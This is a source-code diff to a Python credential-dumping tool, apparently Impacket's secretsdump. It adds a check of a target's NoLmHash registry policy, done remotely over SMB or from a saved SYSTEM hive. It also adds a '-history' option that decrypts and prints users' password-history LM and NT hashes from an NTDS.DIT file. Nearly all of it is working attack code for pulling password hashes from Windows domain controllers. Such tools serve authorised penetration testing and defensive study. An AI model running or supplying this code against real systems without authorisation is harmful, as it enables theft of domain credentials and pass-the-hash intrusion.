@@ -427,6 +427,23 @@ class RemoteOperations:
 
         return self.__bootKey
 
+    def checkNoLMHashPolicy(self):
+        logging.debug('Checking NoLMHash Policy')
+        ans = self.__winreg.openHKLM()
+        self.__regHandle = ans.get_context_handle()
+
+        ans = self.__winreg.regOpenKey(self.__regHandle, 'SYSTEM\\CurrentControlSet\\Control\\Lsa',winreg.KEY_READ)
+        keyHandle = ans.get_context_handle()
+        ans = self.__winreg.regQueryValue(keyHandle, 'NoLmHash', 10)
+        noLMHash = ans.get_data()
+
+        if noLMHash != 1:
+            logging.debug('LMHashes are being stored')
+            return False
+
+        logging.debug('LMHashes are NOT being stored')
+        return True
+
     def __retrieveHive(self, hiveName):
         tmpFileName = ''.join([random.choice(string.letters) for i in range(8)]) + '.tmp'
         ans = self.__winreg.openHKLM()
@@ -1071,9 +1088,18 @@ class NTDSHashes():
             ('EncryptedHash','16s=""'),
         )
 
-    def __init__(self, ntdsFile, bootKey, isRemote = False):
+    class CRYPTED_HISTORY(Structure):
+        structure = (
+            ('Header','8s=""'),
+            ('KeyMaterial','16s=""'),
+            ('EncryptedHash',':'),
+        )
+
+    def __init__(self, ntdsFile, bootKey, isRemote = False, history = False, noLMHash = True):
         self.__bootKey = bootKey
         self.__NTDS = ntdsFile
+        self.__history = history
+        self.__noLMHash = noLMHash
         if self.__NTDS is not None:
             self.__ESEDB = ESENT_DB(ntdsFile, isRemote = isRemote)
             self.__cursor = self.__ESEDB.openTable('datatable')
@@ -1159,6 +1185,36 @@ class NTDSHashes():
         answer =  "%s:%s:%s:%s:::" % (userName, rid, LMHash.encode('hex'), NTHash.encode('hex'))
         self.__itemsFound[record[self.NAME_TO_INTERNAL['objectSid']].decode('hex')] = answer
         print answer
+      
+        if self.__history:
+            LMHistory = []
+            NTHistory = []
+            if record[self.NAME_TO_INTERNAL['lmPwdHistory']] is not None:
+                lmPwdHistory = record[self.NAME_TO_INTERNAL['lmPwdHistory']]
+                encryptedLMHistory = self.CRYPTED_HISTORY(record[self.NAME_TO_INTERNAL['lmPwdHistory']].decode('hex'))
+                tmpLMHistory = self.__removeRC4Layer(encryptedLMHistory)
+                for i in range(0, len(tmpLMHistory)/16):
+                    LMHash = self.__removeDESLayer(tmpLMHistory[i*16:(i+1)*16], rid)
+                    LMHistory.append(LMHash)
+
+            if record[self.NAME_TO_INTERNAL['ntPwdHistory']] is not None:
+                ntPwdHistory = record[self.NAME_TO_INTERNAL['ntPwdHistory']]
+                encryptedNTHistory = self.CRYPTED_HISTORY(record[self.NAME_TO_INTERNAL['ntPwdHistory']].decode('hex'))
+                tmpNTHistory = self.__removeRC4Layer(encryptedNTHistory)
+                for i in range(0, len(tmpNTHistory)/16):
+                    NTHash = self.__removeDESLayer(tmpNTHistory[i*16:(i+1)*16], rid)
+                    NTHistory.append(NTHash)
+
+            for i, (LMHash, NTHash) in enumerate(map(lambda l,n: (l,n) if l else ('',n), LMHistory[1:], NTHistory[1:])):
+                if self.__noLMHash:
+                    lmhash = ntlm.LMOWFv1('','').encode('hex')
+                else:
+                    lmhash = LMHash.encode('hex')
+            
+                answer =  "%s_history%d:%s:%s:%s:::" % (userName, i, rid, lmhash, NTHash.encode('hex'))
+                self.__itemsFound[record[self.NAME_TO_INTERNAL['objectSid']].decode('hex')+str(i)] = answer
+                print answer
+        
 
     def dump(self):
         if self.__NTDS is None:
@@ -1197,7 +1253,7 @@ class NTDSHashes():
 
 
 class DumpSecrets:
-    def __init__(self, address, username = '', password = '', domain='', hashes = None, system=False, security=False, sam=False, ntds=False, outputFileName = None):
+    def __init__(self, address, username = '', password = '', domain='', hashes = None, system=False, security=False, sam=False, ntds=False, outputFileName = None, history=False):
         self.__remoteAddr = address
         self.__username = username
         self.__password = password
@@ -1213,6 +1269,8 @@ class DumpSecrets:
         self.__securityHive = security
         self.__samHive = sam
         self.__ntdsFile = ntds
+        self.__history = history
+        self.__noLMHash = True
         self.__isRemote = True
         self.__outputFileName = outputFileName
 
@@ -1249,17 +1307,37 @@ class DumpSecrets:
 
         return bootKey
 
+    def checkNoLMHashPolicy(self):
+        logging.debug('Checking NoLMHash Policy')
+        winreg = winregistry.Registry(self.__systemHive, self.__isRemote)
+        # We gotta find out the Current Control Set
+        currentControlSet = winreg.getValue('\\Select\\Current')[1]
+        currentControlSet = "ControlSet%03d" % currentControlSet
+
+        noLmHash = winreg.getValue('\\%s\\Control\\Lsa\\NoLmHash' % currentControlSet)[1]
+
+        if noLmHash != 1:
+            logging.debug('LMHashes are being stored')
+            return False
+        logging.debug('LMHashes are NOT being stored')
+        return True
+
     def dump(self):
             try:
                 if self.__remoteAddr.upper() == 'LOCAL' and self.__username == '':
                     self.__isRemote = False
                     bootKey = self.getBootKey()
+                    if self.__ntdsFile is not None:
+                        # Let's grab target's configuration about LM Hashes storage
+                        self.__noLMHash = self.checkNoLMHashPolicy()
                 else:
                     self.__isRemote = True
                     self.connect()
                     self.__remoteOps  = RemoteOperations(self.__smbConnection)
                     self.__remoteOps.enableRegistry()
                     bootKey             = self.__remoteOps.getBootKey()
+                    # Let's check whether target system stores LM Hashes
+                    self.__noLMHash = self.__remoteOps.checkNoLMHashPolicy()
 
                 if self.__isRemote == True:
                     SAMFileName         = self.__remoteOps.saveSAM()
@@ -1289,7 +1367,7 @@ class DumpSecrets:
                 else:
                     NTDSFileName        = self.__ntdsFile
 
-                self.__NTDSHashes   = NTDSHashes(NTDSFileName, bootKey, isRemote = self.__isRemote)
+                self.__NTDSHashes   = NTDSHashes(NTDSFileName, bootKey, isRemote = self.__isRemote, history = self.__history, noLMHash = self.__noLMHash)
                 self.__NTDSHashes.dump()
 
                 if self.__outputFileName is not None:
@@ -1331,6 +1409,7 @@ if __name__ == '__main__':
     parser.add_argument('-security', action='store', help='SECURITY hive to parse')
     parser.add_argument('-sam', action='store', help='SAM hive to parse')
     parser.add_argument('-ntds', action='store', help='NTDS.DIT file to parse')
+    parser.add_argument('-history', action='store_true', help='Dump password history')
     parser.add_argument('-outputfile', action='store', help='base output filename. Extensions will be added for sam, secrets, cached and ntds')
     group = parser.add_argument_group('authentication')
 
@@ -1362,7 +1441,7 @@ if __name__ == '__main__':
             from getpass import getpass
             password = getpass("Password:")
 
-    dumper = DumpSecrets(address, username, password, domain, options.hashes, options.system, options.security, options.sam, options.ntds, options.outputfile)
+    dumper = DumpSecrets(address, username, password, domain, options.hashes, options.system, options.security, options.sam, options.ntds, options.outputfile, options.history)
 
     try:
         dumper.dump()
